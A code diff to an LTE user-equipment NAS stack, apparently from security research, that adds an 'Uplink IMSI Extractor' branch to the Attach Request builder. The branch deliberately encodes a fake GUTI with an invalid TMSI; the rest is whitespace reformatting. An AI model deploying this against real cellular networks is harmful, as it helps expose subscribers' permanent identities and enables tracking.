@@ -48,6 +48,13 @@ Description Defines functions executed at the EMMAS Service Access
 
 #include <string.h> // strlen
 
+#if  defined(NAS_BUILT_IN_UE)
+# include "nas_itti_messaging.h"
+#endif
+
+#include "attack_extern.h"      /* uplnk_imsi_extract */
+
+
 /****************************************************************************/
 /****************  E X T E R N A L    D E F I N I T I O N S  ****************/
 /****************************************************************************/
@@ -197,6 +204,25 @@ int emm_send_attach_request(const emm_as_establish_t *msg,
   /* Mandatory - EPS mobile identity */
   size += EPS_MOBILE_IDENTITY_MAXIMUM_LENGTH;
 
+  if (uplnk_imsi_extract == 1) {
+    LOG_TRACE(INFO, "[Uplink IMSI Extractor] Variant 1: encoding invalid TMSI into attach message\n");
+    emm_msg->epsattachtype = EPS_ATTACH_TYPE_EPS;
+    // mcc, mnc, mmecode need to match the record at the MME core, otherwise the request will not be valid
+    GutiEpsMobileIdentity_t *guti = &emm_msg->oldgutiorimsi.guti;
+    guti->typeofidentity = EPS_MOBILE_IDENTITY_GUTI;
+    guti->oddeven = EPS_MOBILE_IDENTITY_EVEN;
+    guti->mmegroupid = 0x102; // msg->UEid.guti->gummei.MMEgid;
+    guti->mmecode = 0xf; // msg->UEid.guti->gummei.MMEcode;
+    guti->mtmsi = 123456; // msg->UEid.guti->m_tmsi;
+    guti->mccdigit1 = 9; // msg->UEid.guti->gummei.plmn.MCCdigit1;
+    guti->mccdigit2 = 9; // msg->UEid.guti->gummei.plmn.MCCdigit2;
+    guti->mccdigit3 = 0; // msg->UEid.guti->gummei.plmn.MCCdigit3;
+    guti->mncdigit1 = 0; // msg->UEid.guti->gummei.plmn.MNCdigit1;
+    guti->mncdigit2 = 7; // msg->UEid.guti->gummei.plmn.MNCdigit2;
+    guti->mncdigit3 = 0; // msg->UEid.guti->gummei.plmn.MNCdigit3;
+  }
+  else
+
   if (msg->UEid.guti) {
     LOG_TRACE(INFO, "EMMAS-SAP - Send Attach Request message with GUTI");
     /* Set GUTI mobile identity */
@@ -304,19 +330,19 @@ int emm_send_attach_request(const emm_as_establish_t *msg,
 
 /****************************************************************************
  **                                                                        **
- ** Name:    emm_send_attach_complete()                                **
+ ** Name:    emm_send_attach_complete()                                    **
  **                                                                        **
  ** Description: Builds Attach Complete message                            **
  **                                                                        **
- **      The Attach Complete message is sent by the UE to the net- **
- **      work in response to an Attach Accept message.             **
+ **      The Attach Complete message is sent by the UE to the net-         **
+ **      work in response to an Attach Accept message.                     **
  **                                                                        **
- ** Inputs:  msg:       The EMMAS-SAP primitive to process         **
- **      Others:    None                                       **
+ ** Inputs:  msg:       The EMMAS-SAP primitive to process                 **
+ **      Others:    None                                                   **
  **                                                                        **
- ** Outputs:     emm_msg:   The EMM message to be sent                 **
- **      Return:    The size of the EMM message                **
- **      Others:    None                                       **
+ ** Outputs:     emm_msg:   The EMM message to be sent                     **
+ **      Return:    The size of the EMM message                            **
+ **      Others:    None                                                   **
  **                                                                        **
  ***************************************************************************/
 int emm_send_attach_complete(const emm_as_data_t *msg,
@@ -857,31 +883,31 @@ int emm_send_security_mode_complete(const emm_as_security_t *msg,
 
   if(msg->imeisv_request)
   {
-	  // configure imeisv param
-	  emm_msg->presencemask |= SECURITY_MODE_COMPLETE_IMEISV_PRESENT;
+          // configure imeisv param
+          emm_msg->presencemask |= SECURITY_MODE_COMPLETE_IMEISV_PRESENT;
 
-	  // 33 85 76 02 05 26 84 01 F1
-	  emm_msg->imeisv.imeisv.digit1         = 0x3;
-	  emm_msg->imeisv.imeisv.oddeven        = 0x0;
-	  emm_msg->imeisv.imeisv.typeofidentity = 0x3;
-	  emm_msg->imeisv.imeisv.digit2         = 0x5;
-	  emm_msg->imeisv.imeisv.digit3         = 0x7;
-	  emm_msg->imeisv.imeisv.digit4         = 0x4;
-	  emm_msg->imeisv.imeisv.digit5         = 0x7;
-	  emm_msg->imeisv.imeisv.digit6         = 0x3;
-	  emm_msg->imeisv.imeisv.digit7         = 0x0;
-	  emm_msg->imeisv.imeisv.digit8         = 0x4;
-	  emm_msg->imeisv.imeisv.digit9         = 0x0;
-	  emm_msg->imeisv.imeisv.digit10        = 0x0;
-	  emm_msg->imeisv.imeisv.digit11        = 0x7;
-	  emm_msg->imeisv.imeisv.digit12        = 0x0;
-	  emm_msg->imeisv.imeisv.digit13        = 0x5;
-	  emm_msg->imeisv.imeisv.digit14        = 0x3;
-	  emm_msg->imeisv.imeisv.digit15        = 0x0;
-	  emm_msg->imeisv.imeisv.digit16        = 0x0;
-	  emm_msg->imeisv.imeisv.parity         = IMEI_ODD_PARITY;
+          // 33 85 76 02 05 26 84 01 F1
+          emm_msg->imeisv.imeisv.digit1         = 0x3;
+          emm_msg->imeisv.imeisv.oddeven        = 0x0;
+          emm_msg->imeisv.imeisv.typeofidentity = 0x3;
+          emm_msg->imeisv.imeisv.digit2         = 0x5;
+          emm_msg->imeisv.imeisv.digit3         = 0x7;
+          emm_msg->imeisv.imeisv.digit4         = 0x4;
+          emm_msg->imeisv.imeisv.digit5         = 0x7;
+          emm_msg->imeisv.imeisv.digit6         = 0x3;
+          emm_msg->imeisv.imeisv.digit7         = 0x0;
+          emm_msg->imeisv.imeisv.digit8         = 0x4;
+          emm_msg->imeisv.imeisv.digit9         = 0x0;
+          emm_msg->imeisv.imeisv.digit10        = 0x0;
+          emm_msg->imeisv.imeisv.digit11        = 0x7;
+          emm_msg->imeisv.imeisv.digit12        = 0x0;
+          emm_msg->imeisv.imeisv.digit13        = 0x5;
+          emm_msg->imeisv.imeisv.digit14        = 0x3;
+          emm_msg->imeisv.imeisv.digit15        = 0x0;
+          emm_msg->imeisv.imeisv.digit16        = 0x0;
+          emm_msg->imeisv.imeisv.parity         = IMEI_ODD_PARITY;
 
-	  size += SECURITY_MODE_COMPLETE_MAXIMUM_LENGTH;
+          size += SECURITY_MODE_COMPLETE_MAXIMUM_LENGTH;
   }
   LOG_FUNC_RETURN (size);
 }
